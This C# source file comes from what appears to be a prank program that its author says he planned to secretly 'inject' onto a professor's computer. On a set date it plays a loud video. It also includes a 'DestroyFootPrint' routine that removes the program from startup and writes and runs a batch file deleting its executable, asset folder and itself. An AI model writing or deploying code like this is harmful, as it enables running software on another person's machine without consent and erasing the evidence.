using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using BoneFier.Basic;
using ReflectionClassOverriding;
using BoneFier;

namespace Script
{
    /// <summary>
    /// the Script that I palnned to inject to one our professor in the university for fun.
    /// </summary>
    internal class HappyTrolling : Behavior
    {
        static AppConfig config;
        static bool TrollsActivated = false;
        public static string VideoPath = @"C:\Users\msi PC\Desktop\Cristiano_Ronaldo_yells_siuuu_1,048,576_times_em5rwYX8DVY.mp4";


        void Start()
        {

        }
        void Update()
        {
            config = Program.application.ApplicationConfig;

            if(!TrollsActivated)
            if (Calendarmanager.CheckActivationDate(config.Activationdate.ToDateTime()))
            {
                if (!config.Enable)
                {
                    Debuger.PrintWarning("The program is disabled.");
                    DestroyFootPrint();
                    return;
                }

                Debuger.Print("Trolls Activated");
                TrollsActivated = true;
                //ترول فعال میشود
                //MultipleErros(3);
                PlayVideo();
                //Console.Beep(1500, 2000);
            }

        }

        static void MultipleErros(int count)
        {
        }
        [STAThread]
        static void PlayVideo()
        {
            Trollplayer videoplayer = new Trollplayer();
            //siuuu = https://www.youtube.com/watch?v=em5rwYX8DVY
            //Man yek hackeram = https://www.youtube.com/shorts/1X9uIWQgHR4



            System.Windows.Forms.Application.Run(videoplayer);

        }
        static void DestroyFootPrint() // تابع پاک کردن رد پا
        {
            Debuger.Print("Destroying foot prints.");

            kernel.RemoveStartUp(Program.emigrator.ApplicationName); //حذف کردن برنامه از لیست برنامه های استارت اپ

            //ساخت فایل بت برای حذف فایل ها و برنامه
            /*BATCH code for deleting files:
                 timeout 1
                 del "BoneFierApp.exe"
                 @RD /S /Q "BFasset"    
                 del "FootCleanerBATCH.bat"
             */

            string BATscript = "timeout 1\ndel \"BoneFierApp.exe\"\n@RD /S /Q \"BFasset\"\ndel \"FootprintCleaner.bat\"";

            File.WriteAllText(Program.emigrator.EmigrationPath + @"\FootprintCleaner.bat", BATscript);
            Process.Start(@"FootprintCleaner.bat");

            Application.Exit(); //Good bye world.
        }
    }
}
